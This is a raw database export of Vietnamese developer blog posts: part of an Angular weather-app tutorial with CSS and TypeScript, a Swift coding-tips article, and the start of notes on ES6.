translateX(-103%);\n  position: relative;\n  top: 0;\n  left: 0;\n  z-index: 10;\n  height: 100%;\n  width: 90%;\n  max-width: 26rem;\n  background-color: white;\n  box-shadow: 0 0 2rem rgba(0, 0, 255, 0.1);\n  display: grid;\n  grid-template-columns: 1fr;\n  grid-template-rows: 2fr 4fr 1fr;\n  grid-gap: 1rem;\n  transition: transform 300ms linear;\n  will-change: transform;\n}\n\n.slide-menu-active {\n  transform: none;\n}\n\n.menu-header {\n  background: linear-gradient(to right, #00FF9B, #5f84fb);\n  display: grid;\n  grid-template-rows: 1fr 4fr;\n  grid-template-columns: 1fr 4fr;\n  grid-template-areas: "greeting greeting" "image details";\n  box-sizing: border-box;\n  width: 100%;\n  align-content: center;\n  color: white;\n  box-shadow: 0 0.5rem 2rem rgba(0, 0, 255, 0.2);\n}\n\n.greeting__text {\n  grid-area: greeting;\n  font-size: 1.25rem;\n  letter-spacing: 0.15rem;\n  text-transform: uppercase;\n  margin-top: 1rem;\n  justify-self: center;\n  align-self: center;\n}\n\n.account-details {\n  grid-area: details;\n  display: flex;\n  flex-flow: column;\n  margin-left: 1rem;\n  align-self: center;\n}\n\n.name__text {\n  font-size: 1.15rem;\n  margin-bottom: 0.5rem;\n}\n\n.email__text {\n  font-size: 0.9rem;\n  letter-spacing: 0.1rem;\n}\n\n.menu-body {\n  display: grid;\n  width: 100%;\n}\n\n.profile-image__container {\n  grid-area: image;\n  margin-right: 0.5rem;\n  border-radius: 50%;\n  height: 4rem;\n  width: 4rem;\n  overflow: hidden;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  background-color: white;\n  align-self: center;\n  margin-left: 2rem;\n}\n\n.profile__image {\n  max-width: 4rem;\n}\n\n/*Header*/\n.main__header {\n  width: 100%;\n  display: grid;\n  grid-template-columns: 1fr 1fr 0.25fr;\n  grid-template-rows: 1fr;\n  box-shadow: 0 0 2rem rgba(0, 0, 255, 0.1);\n  height: 4rem;\n  margin: 0;\n  align-items: center;\n  transition: background-color 500ms linear;\n  animation: 1s ease-in-out 0ms 1 fadein;\n}\n\n.main__header-dark {\n  background-color: #2B244D;\n  color: white;\n}\n\n.toggle-button__container {\n  cursor: pointer;\n  position: relative;\n  margin: 0 0.5rem;\n}\n\n.mode-toggle__input {\n  -webkit-appearance: none;\n  -moz-appearance: none;\n}\n\n.mode-toggle__bg {\n  height: 1rem;\n  width: 2rem;\n  border-radius: 0.5rem;\n  background-color: rgba(0, 0, 0, 0.5);\n  display: inline-block;\n  transition: background-color 300ms linear;\n}\n\n.mode-toggle__circle {\n  height: 1.30rem;\n  width: 1.30rem;\n  background-color: #2B244D;\n  position: absolute;\n  top: -0.2rem;\n  border-radius: 50%;\n  box-shadow: 0 0 0 rgba(0, 0, 255, 0.5);\n  transition: left 300ms linear;\n  left: 0.1rem;\n}\n\n.mode-toggle__circle-checked {\n  background-color: white;\n  left: 1.75rem;\n}\n\n.mode-toggle__bg-checked {\n  background-color: #FF0070;\n}\n\n.mode-toggle__text {\n  font-size: 0.75rem;\n  text-transform: uppercase;\n  letter-spacing: 0.1rem;\n}\n\n/*Content*/\n.left__section {\n  display: grid;\n  grid-template-rows: 1fr;\n  grid-template-columns: 1fr 1fr;\n  max-width: 5rem;\n}\n\n.date__text {\n  text-transform: uppercase;\n  letter-spacing: 0.1rem;\n  display: inline;\n  margin: 0.5rem 0;\n}\n\n/*SVGs*/\n.hamburger__icon {\n  position: relative;\n  z-index: 35;\n  height: 1rem;\n  padding: 0.5rem 1.5rem;\n  margin-right: 1rem;\n  cursor: pointer;\n}\n\n.logo__icon {\n  height: 2rem;\n  margin-left: 1rem;\n}\n\n.logo__text {\n  fill: #2B244D;\n}\n\n.logo__text-dark {\n  fill: #ffff;\n}\n\n.hamburger__icon__fill {\n  fill: #2B244D;\n}\n\n.hamburger__icon__fill-dark {\n  fill: #ffff;\n}\n\n/*\n================\n    Body\n================\n*/\n\n.main-container__bg {\n  height: 100%;\n  width: 100%;\n  position: absolute;\n  top: 0;\n  left: 0;\n  z-index: -2;\n  opacity: 0;\n  background: white;\n  transition: opacity 300ms linear;\n}\n\n.main-container__bg-dark {\n  opacity: 1;\n  background: linear-gradient(to bottom, #B290FF, #2E1D65);\n  transition: opacity 300ms linear;\n}\n\n/*\n================-\n    Footer\n================\n*/\n.main__footer {\n  background: transparent;\n  position: absolute;\n  bottom: 1rem;\n  left: 1.5rem;\n  z-index: 100;\n}\n\n.copyright__text {\n  letter-spacing: 0.1rem;\n  color: white;\n}\n\n@media only screen and (max-width: 300px) {\n  .slide-menu {\n    width: 100%;\n  }\n}\n```\n**Hoa mắt nhỉ, giờ giải thích cụ thể hơn đoạn CSS trên nhé**\n\n* Bố cục\n```\ndisplay: grid;  \ngrid-template-columns: auto;\ngrid-template-rows: 0.5fr auto;\n```\nỞ đây ta dùng CSS grid để chia bố cục, 1 phần nhỏ phía trên cho navbar, phần to phía dưới cho router outlet, cũng chính là nội dung của trang, giống như thế này:\n\n![](https://images.viblo.asia/11a75f08-2ffa-4519-ae26-31dc7540bdf9.png)\n\n* sidenav\n```\n.side-menu__conatiner {\n    position: fixed; \n    left: 0;\n    top: 0 \n}\n```\nfix cứng vị trí của sidenav là trên cùng bên tay trái\n```\n.slide-menu { transform: translateX(-103%); }\n```\ntranslateX ở đây sẽ dịch chuyển `slide-menu` theo trục X 1 đoạn -103%, tức là giấu nó vào bên trái ý, sau đó ta thêm vào class `.slide-menu-active`\n```\n.slide-menu-active {  transform: none; }\n```\nđể reset lại, `slide-menu` sẽ hiện thị ra luôn, ko bị giấu đi nữa.\n\nBố cục của chúng ta như thế này\n![](https://images.viblo.asia/ff7c99b6-c7ae-44ec-8001-84501ecd97a9.png)\n\nDemo\n![](https://images.viblo.asia/be75cc71-57e4-4677-ba1b-23d37ec4c410.gif)\n\n* **Nút chuyển đổi**\n\n![](https://images.viblo.asia/12795893-9c94-4f13-8561-b700875e7f61.gif)\n\nMột mẹo nhỏ về UI là cách hiển thị nút chuyển đổi giữa 2 kiểu giao diện. Đầu tiên ta set `none` cho thuộc tính `appearance` để bỏ đi các css mặc định, sau đó sử dụng 2 class cho nền nút chuyển đổi và màu sắc, vị trí của hình tròn, ta dùng 1 biến boolean để lưu trữ kiểu giao diện hiện tại, chuyển đổi giữa 2 class bằng `ngClass` đã được tích hợp sẵn trong Angular.\n\n* **Home component**\nĐây là component Home dùng để hiển thị các thẻ thời tiết của thành phố yêu thích của người dùng, từ đây anh ta cũng có thể nhấp vào thêm thành phố để thêm vào trang chủ của mình.\n\nĐầu tiên chúng ta tạo component bằng lệnh sau:\n```\nng g c home\n```\nTrong component này chúng ta sẽ gọi đến và hiển thị 2 component là `weather-card` và `add-card`\n```\n<div class="main__container">\n\n  <app-weather-card></app-weather-card>\n  <app-add-card></app-add-card>\n\n</div>\n```\n* **Weather card component**\n\nỞ đây ta dùng `ngSwitch` để chuyển giữa các kiểu thời tiết\n```\n<section class="weather__card" (click)="openDetails()" [ngClass]="{'weather__card-dark': darkMode}">\n  <!-- TODO: make the city name dynamic -->\n  <span class="city-name__text">Paris</span>\n    <div class="weather-icon__container" [ngSwitch]="true">\n\n      <svg *ngSwitchCase="condition === 'Clouds'">\n        </svg>\n\n        <svg *ngSwitchCase="condition === 'Rain' || condition === 'Drizzle'">\n        </svg>\n\n        <svg *ngSwitchCase="condition === 'Storm'">\n        </svg>\n\n\n        <svg *ngSwitchCase="condition === 'Sunny' || condition === 'Clear'">\n        </svg>\n\n      <svg  *ngSwitchCase="condition === 'Fog'"></svg>\n    </div>\n    <div class="temperature-text__container">\n        <span class="temperature__text">{{ currentTemp }}</span>\n        <span class="temperature-metric__text">°</span>\n        <span class="weather-condition__text">{{ condition }}</span>\n    </div>\n    <section class="min-max__container">\n        <div class="min__container">\n            <svg class="min-arrow__icon" viewBox="188.5 807 21 21">\n                <path fill="#00ff9b" d="M209.5 817.5h-21L199 828z" data-name="Min Arrow"/>\n            </svg>\n\n            <span class="min-temperature__text">{{ minTemp }}</span>\n            <span class="min__text">Min</span>\n        </div>\n        <div class="max__container">\n            <svg class="max-arrow__icon" viewBox="449.5 820 21 21">\n                <path fill="red" d="M449.5 830.5h21L460 820z" data-name="Max Arrow"/>\n            </svg>\n            <span class="max-temperature__text">{{ maxTemp }}</span>\n            <span class="max__text">Max</span>\n        </div>\n    </section>\n</section>\n```\nThêm CSS\n```\n/*\n====================\nWeather Card Styling\n====================\n*/\n.weather__card {\n  display: grid;\n  grid-template-columns: 1fr;\n  grid-template-rows: 1fr 1fr 1fr;\n  box-shadow: 0 0 2rem rgba(0, 0, 255, 0.1);\n  justify-items: center;\n  padding: 2rem;\n  margin: 2rem;\n  width: 19rem;\n  height: 30rem;\n  cursor: pointer;\n  background-color: white;\n  border-radius: 1.75rem;\n  animation: 1.25s ease-in-out 0ms 1 fadein;\n}\n\n.weather__card-dark {\n  background: linear-gradient(to bottom, #711B86, #00057A);\n  color: white;\n}\n\n.city-name__text {\n  text-transform: uppercase;\n  font-size: 1.4rem;\n  letter-spacing: 0.1rem;\n  margin-bottom: 1rem;\n}\n\n.temperature__text {\n  align-self: end;\n  width: 100%;\n  font-size: 4rem;\n  font-weight: 100;\n  letter-spacing: 0.1rem;\n}\n\n.temperature-metric__text {\n  text-align: start;\n  font-size: 3rem;\n}\n\n.min-max__container {\n  display: grid;\n  grid-template-rows: 1fr;\n  grid-template-columns: 1fr 1fr;\n  align-items: center;\n}\n\n.min__container, .max__container {\n  margin: 1rem 3rem;\n  display: grid;\n  grid-template-columns: 1fr;\n  grid-template-rows: 1fr 1fr;\n}\n\n.min-arrow__icon, .max-arrow__icon {\n  height: 1.25rem;\n  margin: auto;\n}\n\n.max-arrow__icon {\n  margin-bottom: -0.05rem;\n}\n\n.weather-condition__text {\n  display: block;\n  font-size: 1rem;\n  text-transform: uppercase;\n  letter-spacing: 0.1rem;\n  text-align: center;\n}\n\n.max__text {\n  color: #FF0070;\n}\n\n.min__text {\n  color: #00FF9B;\n}\n\n.max__text, .min__text {\n  font-size: 1rem;\n  text-align: center;\n}\n\n.max-temperature__text, .min-temperature__text {\n  text-align: center;\n  font-size: 2rem;\n  margin: 0 5px 0 20px;\n}\n\n.weather-icon__container {\n  width: 10rem;\n  margin-bottom: 2rem;\n  display: flex;\n  justify-content: center;\n}\n\n.weather-icon__container > svg {\n  width: 10rem;\n}\n```\nTa sẽ được demo thế này\n\n![](https://images.viblo.asia/14026d73-d41c-4121-8493-2bf877a9e9e5.png)\n\n**Chế độ ban đêm**\n\nBạn có thể thấy có 1 số css thêm hậu tố `-dark` là để dùng cho chế độ ban đêm, vẫn dùng `ngClass` để chuyển đổi class. Ví dụ trong trường hợp này, khi chuyển sang chế độ ban đêm\n\n![](https://images.viblo.asia/a1e86ac1-9e08-4ec4-a2bf-a18c79c36368.png)\n\n* **Add card component**\n\nỞ component add card thì ta cũng thêm `ngClass` cho chế độ ban đêm, và thêm `routerLink` để điều hướng người dùng đến trang thêm thành phố khi click vào card đó\n```\n<div class="add__card" routerLink="/add" [ngClass]="{'add__card-dark': darkMode}">\n  <div class="header__container">\n  <span class="card__title">Add city</span>\n  </div>\n  <div class="body__container">\n    <svg class="add__icon"></svg>\n    <svg class="city__illustration"></svg>\n  </div>\n</div>\n```\nCss về cơ bản cũng không khác quá nhiều, vì nó cần đồng bộ vs các card khác, vẫn sử dụng grid layout\n```\n.add__card {\n  background-color: #ffffff;\n  box-shadow: 0 0 2rem rgba(0, 0, 255, 0.1);\n  display: grid;\n  grid-template-columns: 1fr;\n  grid-template-rows: 1fr 1fr;\n  padding: 2rem;\n  margin: 2rem;\n  width: 19rem;\n  height: 30rem;\n  justify-items: center;\n  cursor: pointer;\n  border-radius: 1.75rem;\n  animation: 1.25s ease-in-out 0ms 1 fadein;\n  color: #443282;\n}\n\n.add__card-dark {\n  background: linear-gradient(to bottom, #711B86, #00057A);\n  color: white;\n}\n\n.card__title {\n  text-transform: uppercase;\n  letter-spacing: 0.1rem;\n}\n\n.city__illustration {\n  width: 20rem;\n}\n\n.body__container {\n  align-self: end;\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  flex-flow: column;\n}\n\n.add__icon {\n  width: 10rem;\n  margin-bottom: 1.15rem;\n}\n```\nKết quả\n\n![](https://images.viblo.asia/a7673b67-1500-44f6-896b-b153a2e4dea0.png)\n\n* **Detail component**\n\nĐây là component để hiển thị chi tiết thời tiết 1 thành phố. Ta sử dụng `WeatherService` để lấy dữ liệu thời tiết trong ngày hôm nay và 5 ngày tới, lưu vào các biến riêng để hiển thị ngoài màn hình\n```\nimport {Component, OnDestroy, OnInit} from '@angular/core';\nimport {ActivatedRoute} from '@angular/router';\nimport {WeatherService} from '../../services/weather/weather.service';\nimport {Subscription} from 'rxjs';\n\n@Component({\n  selector: 'app-details',\n  templateUrl: './details.component.html',\n  styleUrls: ['./details.component.css']\n})\nexport class DetailsComponent implements OnInit, OnDestroy {\n\n  city: string;\n  state: string;\n  temp: number;\n  hum: number;\n  wind: number;\n\n  today: string;\n\n  day1Name: string;\n  day1State: string;\n  day1Temp: number;\n\n\n  day2Name: string;\n  day2State: string;\n  day2Temp: number;\n\n  day3Name: string;\n  day3State: string;\n  day3Temp: number;\n\n  day4Name: string;\n  day4State: string;\n  day4Temp: number;\n\n  day5Name: string;\n  day5State: string;\n  day5Temp: number;\n\n  sub1: Subscription;\n  sub2: Subscription;\n  sub3: Subscription;\n  sub4: Subscription;\n  sub5: Subscription;\n\n  constructor(public activeRouter: ActivatedRoute, public weather: WeatherService) {\n  }\n\n  ngOnInit() {\n\n    const todayNumberInWeek = new Date().getDay();\n    const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];\n    this.today = days[todayNumberInWeek];\n\n    this.activeRouter.paramMap.subscribe((route: any) => {\n\n      this.city = route.params.city;\n      this.sub1 = this.weather.getWeatherState(this.city).subscribe((state) => this.state = state);\n      this.sub2 = this.weather.getCurrentTemp(this.city).subscribe((temperature) => this.temp = temperature);\n      this.sub3 = this.weather.getCurrentHum(this.city).subscribe((humidity) => this.hum = humidity);\n      this.sub4 = this.weather.getCurrentWind(this.city).subscribe((windspeed) => this.wind = windspeed);\n      this.sub5 = this.weather.getForecast(this.city).subscribe((data: any) => {\n        console.log(data);\n        for (let i = 0; i < data.length; i++) {\n          const date = new Date(data[i].dt_txt).getDay();\n          console.log(days[date]);\n          if (((date === todayNumberInWeek + 1) || (todayNumberInWeek === 6 && date === 0)) && !this.day1Name) {\n            this.day1Name = days[date];\n            this.day1State = data[i].weather[0].main;\n            this.day1Temp = Math.round(data[i].main.temp);\n\n          } else if (!!this.day1Name && !this.day2Name && days[date] !== this.day1Name) {\n            this.day2Name = days[date];\n            this.day2State = data[i].weather[0].main;\n            this.day2Temp = Math.round(data[i].main.temp);\n\n          } else if (!!this.day2Name && !this.day3Name && days[date] !== this.day2Name) {\n            this.day3Name = days[date];\n            this.day3State = data[i].weather[0].main;\n            this.day3Temp = Math.round(data[i].main.temp);\n\n          } else if (!!this.day3Name && !this.day4Name && days[date] !== this.day3Name) {\n            this.day4Name = days[date];\n            this.day4State = data[i].weather[0].main;\n            this.day4Temp = Math.round(data[i].main.temp);\n\n          } else if (!!this.day4Name && !this.day5Name && days[date] !== this.day4Name) {\n            this.day5Name = days[date];\n            this.day5State = data[i].weather[0].main;\n            this.day5Temp = Math.round(data[i].main.temp);\n\n          }\n        }\n      });\n\n    });\n\n  }\n\n  ngOnDestroy() {\n    this.sub1.unsubscribe();\n    this.sub2.unsubscribe();\n    this.sub3.unsubscribe();\n    this.sub4.unsubscribe();\n    this.sub5.unsubscribe();\n  }\n}\n```\n\nPhần HTML của trang này có rất nhiều svgs nên rất là dài, vì thế sẽ không đề cập đến trong bài này, bạn có thể vào [đây](https://github.com/hamedbaatour/Minimus) để xem full code nhé. \n\nBài dài quá rồi nên lần sau mình sẽ nói tiếp phần service và router nhé. :3\n\nNguồn: https://medium.com/@hamedbaatour/build-a-real-world-beautiful-web-app-with-angular-6-a-to-z-ultimate-guide-2018-part-i-e121dd1d55e	Lần trước mình đã có một bài hướng dẫn các bạn biến một file pts thành 1 giao diện web, hôm nay chúng ta sẽ bắt tay vào làm một trang web dự báo thời tiết mà hoàn toàn có thể đem ra sử dụng thật luôn, từ các bước thiết kế cho đến lập trình sử dụng Adobe XD, Angular 7 và Firebase.\nBước 1: Thiết kế\nBạn có thể down bản thiết kế tại đây để xem các layer xếp chồng lên nhau thế nào để tạo ra được bản...	{https://images.viblo.asia/9118f690-53a0-4dfe-a224-6cff5021fbb6.png,https://images.viblo.asia/4719b666-2160-4e86-95d0-96855188da10.png,https://images.viblo.asia/3abc2200-8703-4553-b3f2-e662dd1a2138.png,https://images.viblo.asia/147ced94-e1b0-4078-b3bb-a69bd8ed7c02.png,https://images.viblo.asia/0866ea38-9896-4db3-bfd4-7fbddd4460d8.png,https://images.viblo.asia/b262d9ac-3169-476a-b67b-d0db899de5ab.png,https://images.viblo.asia/a7ab1580-6da6-4faf-b9d0-02421da703a1.png,https://images.viblo.asia/e1f2962d-715b-4437-b336-6f853aac5ace.png,https://images.viblo.asia/857d118d-d8ad-4de7-a29a-fccbd13b0ffc.png,https://images.viblo.asia/cc052b8c-01ca-4220-ac2a-ef7f328704af.gif,https://images.viblo.asia/c09e9760-946c-4109-9cf9-829d5f0cd4cf.gif,https://images.viblo.asia/de81e088-3757-46a0-85eb-0e8296d57f8c.gif,https://images.viblo.asia/11a75f08-2ffa-4519-ae26-31dc7540bdf9.png,https://images.viblo.asia/ff7c99b6-c7ae-44ec-8001-84501ecd97a9.png,https://images.viblo.asia/be75cc71-57e4-4677-ba1b-23d37ec4c410.gif,https://images.viblo.asia/12795893-9c94-4f13-8561-b700875e7f61.gif,https://images.viblo.asia/14026d73-d41c-4121-8493-2bf877a9e9e5.png,https://images.viblo.asia/a1e86ac1-9e08-4ec4-a2bf-a18c79c36368.png,https://images.viblo.asia/a7673b67-1500-44f6-896b-b153a2e4dea0.png}	1	Xây dựng một trang web xinh đẹp với Angular 7 - Hướng dẫn từ A tới Z (phần 1)	{angular-7}	0	f	2022-12-18 15:33:37.909+00	2022-12-18 15:33:37.909+00
31962	Khi bắt đầu với lập trình iOS, tôi luôn tò mò về các cách hoạt động tốt nhất ở các công ty lớn, họ cấu trúc project trông như thế nào? Kiến trúc họ đang sử dụng là gì? Thường sử dụng các thư viện nào? Đây là điều mình luôn canh cánh trong lòng để xây dựng dựa trên kinh nghiệm của người khác và không lãng phí thời gian cho những vấn đề đã được giải quyết. \nHãy bắt tay vào thôi!\n\n### Tránh lạm dụng Reference types\n\n- Nên sử dụng reference type cho các object còn `sống`. `Sống` là như thế nào,  hãy cùng xem ví dụ dưới đây\n```Swift\nstruct Car { \n  let model: String\n}\nclass CarManager { \n  private(set) var cars: [Car]\n  func fetchCars()\n  func registerCar(_ car: Car)\n}\n```\n🚗 chỉ là một giá trị, nó đại diện cho dữ liệu. Giống như `0`, nó không quản lý bất cứ điều gì. Vì vậy, nó không phải `sống`. Không có điểm nào xác định nó là một reference type.\n\nMặt khác, `CarManager` cần là 1 object `sống`, bởi vì object đó gọi request tới network và chờ response và lưu trữ các cars đã lấy được từ request. Ta không thể thực hiện bất kỳ hành động bất đồng bộ nào lên một reference type vì có thể chúng sẽ chết. `CarManager` sẽ sống trong phạm vi khi fetch cars từ server tới register new car.\n\n### Không bao giờ sử dụng implicity unwrapped properties\n\nKhông nên sử dụng các thuộc tính ngầm mặc định. Vì bạn có thể quên nó ở hầu hết các trường hợp. Nhưng có thể có một số trường hợp đặc biệt khi đó bạn cần khái niệm này để làm hài lòng trình biên dịch. Và nó rất quan trọng để hiểu logic đằng sau nó.\n\nVề cơ bản, nếu một thuộc tính phải `nil` trong quá trình khởi tạo, nhưng sẽ được gán sau đó cho giá trị không phải là `nil`, bạn có thể khai báo thuộc tính ngầm. Bởi vì bạn sẽ không bao giờ truy cập nó trước khi nó được set, do đó bạn sẽ không muốn trình biên dịch cảnh báo về việc nó bị nil\n\nNếu bạn nghĩ về mối quan hệ view-xib, bạn có thể hiểu hơn. Ví dụ về `nameLabel` outlet ở ví dụ sau\n\n```Swift\nclass SomeView: UIView {\n  @IBOutlet let nameLabel: UILabel\n}\n```\nNếu khai báo như trên, trình biên dịch sẽ cảnh báo bạn khai báo 1 giá trị khởi gạo và gán cho `nameLabel` 1 giá trị khác `nil`.  Điều này hoàn toàn bình thươngf vì bạn khai báo rằng SomeView sẽ luôn có một `nameLabel`. Nhưng bạn không thể làm điều này vì quá trình binding sẽ thực hiện phía sau scenes trong `initWithCoder`. \n\nTrong trường hợp này, bạn định nghĩa nó là một thuộc tính ngầm định. Nó giống như ký hợp đồng với trình biên dịch:\n> You: “This will never be nil, so stop warning me about it.”\n> \n> Compiler: “OK.”\n``` Swift\nclass SomeView: UIView {\n  @IBOutlet var nameLabel: UILabel!\n}\n```\n\nCâu hỏi thường gặp: Có nên sử dụng thuộc tính ngầm định trong khi dequeing một cell từ tableview?\n\n```Swift\nguard let cell = tableView.dequeueCell(...) else {\n  fatalError("Cannot dequeue cell with identifier \\(cellID)")\n}\n```\n\n### Tránh lạm dụng `AppDelegate`\n\n`AppDelegate` không phải là nơi giữ PersistentStoreCoordinator, global objects, helper functions, manager, ...vv. Nó giống như bất kỳ class nào implement 1 protocol. Hãy tách riêng nó ra và không để các phần khác ảnh hưởng đến nó.\n\nVẫn biết rằng có nhiều thứ cần phải ném trong `applicationDidFinishLaunching` nhưng nó quá dễ để vượt khỏi tầm kiểm soát khi dự án ngày một lớn. Hãy luôn cố gắng tạo các class(files) riêng biệt để quản lý các chức năng riêng biệt.\n\nKhông nên\n\n```Swift\nlet persistentStoreCoordinator: NSPersistentStoreCoordinator\nfunc rgb(r: CGFloat, g: CGFloat, b: CGFloat) -> UIColor { ... }\nfunc appDidFinishLaunching... {\n  Firebase.setup("3KDSF-234JDF-234D")\n  Firebase.logLevel = .verbose\n  AnotherSDK.start()\n  AnotherSDK.enableSomething()\n  AnotherSDK.disableSomething()\n  AnotherSDK.anotherConfiguration()\n  persistentStoreCoordinator = ...\n  return true\n}\n```\n\nNên\n\n```Swift\nfunc appDidFinishLaunching... {\n  DependencyManager.configure()\n  CoreDataStack.setup()\n  return true\n}\n```\n\n### Tránh lạm dụng các tham số mặc định\n\nBạn có thể set các giá trị mặc định cho tham số trong function, nó rất tiện lợi vì nếu không bạn sẽ phải tạo nhiều function chỉ để thêm cú pháp. Ví dụ\n``` Swift\nfunc print(_ string: String, options: String?) { ... }\nfunc print(_ string: String) {\n  print(string, options: nil)\n}\n```\nVới parameter mặc định thì\n\n```Swift\nfunc print(_ string: String, options: String? = nil) { ... }!\n```\n[](https://images.viblo.asia/3323bca8-c1c8-46d9-ae96-5303622324a3.gif)\n\nKhá đơn giản, nó đơn giản khi đặt màu mặc định cho custom UI component, để tuỳ chọn các option mặc định cho các chức năng parse function hoặc để chỉ định thời gian chờ  mặc định cho thành phần mạng của bạn, nhưng nên cẩn thận khi quá phụ thuộc vào nó.\n\nHãy xem ví dụ dưới đây\n```Swift\nclass TicketsViewModel {\n  let service: TicketService\n  let database: TicketDatabase\n  init(service: TicketService,\n       database: TicketDatabase) { ... }\n}\n```\nSử dụng trong `App` target\n\n```Swift\nlet model = TicketsViewModel(\n  service: LiveTicketService()\n  database: LiveTicketDatabase()\n)\n```\nSử dụng trong `Test` target\n\n```Swift\nlet model = TicketsViewModel(\n  service: MockTicketService()\n  database: MockTicketDatabase()\n)\n```\n\nLý do bạn có các protocol cho service(TicketService) và database(TicketDatabase) là để trừu tượng hoá. Điều này cho phép bạn thực hiện bất kỳ implementation nào mà bạn muốn trong `TicketsViewModel`. Vì vậy nếu đưa tham số mặc định vào `TicketsViewModel` điều này sẽ khiến ViewModel phụ phuộc vào LiveTicketService, đây là một loại cụ thể. Nó mâu thuẫn với những gì bên trên ta mới đề cập\n\nLiệu đã đủ thuyết phục chưa?\n\nHãy tưởng tượng bạn có các target là `App` và `Test`. `TicketsViewModel` thông thường sẽ được thêm vào cả 2 target, sau đó triển khai viewmodel với từng target khác nhau. Nếu bạn tạo ra một sự phụ thuộc giữa `TicketsViewModel` và `LiveTicketService`  Target Test của bạn sẽ không được biên dịch vì nó ko biết gì về `LiveTicketService`\n\n### Sử dụng vardiric parameters\n\nNó khá là hay, dễ thực hiện\n\n```Swift\nfunc sum(_ numbers: Int...) -> Int {\n  return numbers.reduce(0, +)\n}\nsum(1, 2)       // Returns 3\nsum(1, 2, 3)    // Returns 6\nsum(1, 2, 3, 4) // Returns 10\n```\n\n### Sử dụng nested type\n\nSwift hỗ trợ kiểu inner types để bạn có thể các kiểu lồng bất cứ chỗ nào có ý nghĩa\n\nKhông nên:\n```Swift\nenum PhotoCollectionViewCellStyle {\n  case default\n  case photoOnly\n  case photoAndDescription\n}\n```\nBạn sẽ không bao giờ sử dụng enum này bên ngoài PhotoCollectionViewCell vì vậy không có điểm nào đặt nó trong global.\n\nNên:\n```Swift\nclass PhotoCollectionViewCell {\n  enum Style {\n    case default\n    case photoOnly\n    case photoAndDescription\n  }\n  let style: Style = .default\n  // Implementation...\n}\n```\n\nĐiều này có ý nghĩa hơn vì Style là một phần của PhotoCollectionViewCell và ngắn hơn 23 ký tự so với PhotoCollectionViewCellStyle.\n\n### `Final` là mặc định\n\nCác class nên được `final` theo mặc định bởi vì bạn thường không thiết kế chúng để có thể mở rộng. Vì vậy, nó thực sự là một lỗi không làm cho họ cuối cùng. Ví dụ: bạn đã phân lớp PhotoCollectionViewCell bao nhiêu lần? \n\nBonus: Bạn nhận được thời gian biên dịch tốt hơn một chút.\n\n### Namespace cho constants\n\nBạn có biết rằng bạn có thể đặt tên cho các constants global của mình đúng cách thay vì sử dụng các tiền tố xấu như PFX hoặc k?\n\nKhông nên\n```Swift\nstatic let kAnimationDuration: TimeInterval = 0.3\nstatic let kLowAlpha = 0.2\nstatic let kAPIKey = "13511-5234-5234-59234"\n```\n\nNên\n```Swift\nenum Constant {\n  enum UI {\n    static let animationDuration: TimeInterval = 0.3\n    static let lowAlpha: CGFloat = 0.2  \n  }\n  enum Analytics {\n    static let apiKey = "13511-5234-5234-59234"\n  }\n}\n```\nSở thích cá nhân của tôi là chỉ sử dụng C thay vì Constant vì nó đủ rõ ràng. Bạn có thể chọn bất cứ điều gì bạn thích.\n\nBefore: kAnimationDuration or kAnalyticsAPIKey\nAfter: C.UI.animationDuration or C.Analytics.apiKey\n\nLook good đấy nhỉ :D\n\n### Tránh lạm dụng `_`\n\n_ là một biến lưu chỗ chứa các giá trị không sử dụng. Đó là một cách để nói với tôi, tôi không quan tâm đến giá trị này với trình biên dịch để nó không bị warning.\n\nKhông nên\n```Swift\nif let _ = name {\n  print("Name is not nil.")\n}\n```\n\nNên:\n```Swift\nNil-check:\nif name != nil {\n  print("Name is not nil.")\n}\n```\n\nThường không sử dụng\n```Swift\n_ = manager.removeCar(car) // Returns true if successful.\n```\n- Completion block\n\n```Swift\nservice.fetchItems { data, error, _ in \n  // Hey, I don't care about the 3rd parameter to this block.\n}\n```\n\n### Tránh đặt tên các phương thức mơ hồ\n\nĐiều này thực sự áp dụng cho bất kỳ ngôn ngữ lập trình nào cần được hiểu bởi con người. Mọi người không nên nỗ lực nhiều hơn để hiểu ý của bạn, thật khó để hiểu ngôn ngữ máy tính!\n\nVí dụ, kiểm tra func sau\n\n```Swift\ndriver.driving()\n```\n\nThực sự nó làm gì? Nó kiểm tra nếu lái xe đang lái xe và trả lại đúng nếu như vậy.\n\nRefs: https://medium.com/nsistanbul/swifty-tips-%EF%B8%8F-8564553ba3ec	Khi bắt đầu với lập trình iOS, tôi luôn tò mò về các cách hoạt động tốt nhất ở các công ty lớn, họ cấu trúc project trông như thế nào? Kiến trúc họ đang sử dụng là gì? Thường sử dụng các thư viện nào? Đây là điều mình luôn canh cánh trong lòng để xây dựng dựa trên kinh nghiệm của người khác và không lãng phí thời gian cho những vấn đề đã được giải quyết.\nHãy bắt tay vào thôi!\n\nTránh lạm dụng Re...	{}	1	Swift Tips	{swift,ios}	0	f	2022-12-18 15:33:37.934+00	2022-12-18 15:33:37.934+00
31964	Một số ghi chép của mình trong quá trình học ES hơi sâu :sweat_smile:\n\n# ECMAScript\n- Tên chính thức của Javascript\n- Tài liệu chuẩn hóa Javascript\n- Thường được gọi tắt là ES\n\n# ES6\n\n## ES6 là gì?\n- Bản đặc tả ECMAScript phiên bản 6. Đặc tả tức là bản mô tả chức năng, cú pháp, còn việc có hỗ trợ hay không là phụ thuộc vào phiên bản của từng platform (browser, node.js, babel transpiler,...)\n- Ra đời vào năm 2015 nên còn được gọi là ES2015\n- Là phiên bản nâng cấp lớn của ES5 ra đời vào năm 2009\n- 6 năm cho một lần release là quá lâu và số lượng feature mới cũng là quá nhiều mà chưa có platform nào implement được đầy đủ [1],[2]. Do đó quy trình release đã được thay đổi. Các phiên bản tiếp theo được release theo từng năm và theo quy trình mở [3],[4].\n- Có thể chia ra thành các phiên bản: ES6, ES 2016+ (ES7, ES8, ES9, ES10...) và ES Next (là những chức năng mới sắp được release [5])\n- Vì thường có yêu cầu phải support nhiều phiên bản trình duyệt khác nhau nên chúng ta thường phải sử dụng các transpiler (chẳng hạn babel, swc) để translate ra cú pháp mà support được các browser cũ, do đó khi đọc bảng compatibility table [1] nên chú ý đến cột *Babel + core-js*\n\nTham khảo thêm:\n- [1] https://kangax.github.io/compat-table/es6/\n- [2] https://node.green/\n- [3] https://kipalog.com/posts/Tim-hieu-quy-trinh-TC39\n- [4] http://2ality.com/2015/11/tc39-process.html\n- [5] https://github.com/tc39/proposals/blob/master/finished-proposals.md\n\n## 